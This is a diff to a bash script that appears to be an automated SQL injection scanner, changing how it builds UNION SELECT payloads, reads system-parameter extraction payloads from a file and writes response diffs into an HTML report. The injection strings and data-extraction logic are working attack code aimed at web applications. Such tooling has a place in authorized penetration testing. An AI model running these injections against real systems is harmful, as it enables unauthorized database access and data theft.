@@ -307,7 +307,7 @@ if [[ "$selectsuccess" == 0 ]] ; then
 	lengthselY=`echo $response | cut -d ":" -f 2`
 
 	badparams=`echo "$outputstore" | replace "$encodedpayload" "1$quote+union+select+$nullstring+from+dual$end"`
-	echo "DEBUG oracle $badparams"
+	#echo "DEBUG oracle $badparams"
 	requester
 	statusselDUAL=`echo $response | cut -d ":" -f 1`
 	lengthselDUAL=`echo $response | cut -d ":" -f 2`
@@ -419,13 +419,14 @@ selectsystemstrings()
 {
 echo "Attempting to extract system parameters (reading params from ./payloads/system-params.txt)"
 cat ./payloads/system-params.txt | while read inj3ct ; do
-	badparams=`echo "$outputstore" | replace "$encodedpayload" "0$quote%20union%20select%20$nullstring$end"`
+	badparams=`echo "$outputstore" | replace "$encodedpayload" "0$quote%20union%20select%20$nullstring$end" | replace "+from+dual" ""`
 #	badparams=`echo "$outputstore"`
 	requester
 	rm ./selcheck1
 	cp ./dump ./selcheck1
 	newencodedpayload=`echo $inj3ct | replace " " "%20" | replace "." "%2e" | replace "<" "%3c" | replace ">" "%3e" | replace "?" "%3f" | replace "+" "%2b" | replace "*" "%2a" | replace ";" "%3b" | replace ":" "%3a" | replace "(" "%28" | replace ")" "%29" | replace "," "%2c"`
 	badparams=`echo "$badparams" | replace "$selinject" "$newencodedpayload"`
+	#echo "Debug: $badparams"
 	requester
 	status=`echo $response | cut -d ":" -f 1`
 	systemstring=`diff ./dump ./selcheck1`
@@ -1806,8 +1807,10 @@ cat ./output/$safefilename$safelogname.sorted.txt | while read aLINE ; do
 	if [[ "$message" =~ "LENGTH-DIFF" ]] ; then
 		if [[ "$message" =~ "SEL-LENGTH-DIFF" ]] ; then
 			echo "<br>" >> ./output/$safefilename$safelogname.html
-			selectrespdiff=`echo $message | cut -d " " -f 4`
-			echo " <a href="./../responsediffs/$selectrespdiff">View Response Diff</a>" >> ./output/$safefilename$safelogname.html
+			respdiff=`echo $message | grep -o $safehostname.*` 
+			#echo "debug message=$message"
+			#echo "debug respdiff=$respdiff"
+			echo " <a href="./../responsediffs/$respdiff">View Response Diff</a>" >> ./output/$safefilename$safelogname.html
 			echo "<br>" >> ./output/$safefilename$safelogname.html	
 		else
 			echo "<br>" >> ./output/$safefilename$safelogname.html
